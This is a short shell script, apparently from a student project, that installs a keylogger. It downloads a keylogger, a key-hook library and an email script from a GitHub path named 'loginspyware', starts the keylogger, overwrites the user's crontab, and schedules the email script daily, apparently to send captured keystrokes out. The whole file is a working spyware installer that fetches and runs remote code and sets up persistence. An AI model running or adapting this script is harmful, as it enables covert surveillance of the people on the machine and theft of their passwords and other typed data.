#!/bin/sh -e


wget https://raw.githubusercontent.com/albatujani/OS_FTI_Project/master/loginspyware/email.sh  -P ~/Downloads
wget https://raw.githubusercontent.com/albatujani/OS_FTI_Project/master/loginspyware/keylogger.py  -P ~/Downloads
wget https://raw.githubusercontent.com/albatujani/OS_FTI_Project/master/loginspyware/pyxhook.py -P ~/Downloads
chmod +x ~/Downloads/email.sh

python ~/Downloads/keylogger.py

#install new cron file
crontab mycron

crontab -l | echo "00 17 * * * bash ~/Downloads/email.sh" | crontab -

exit 0
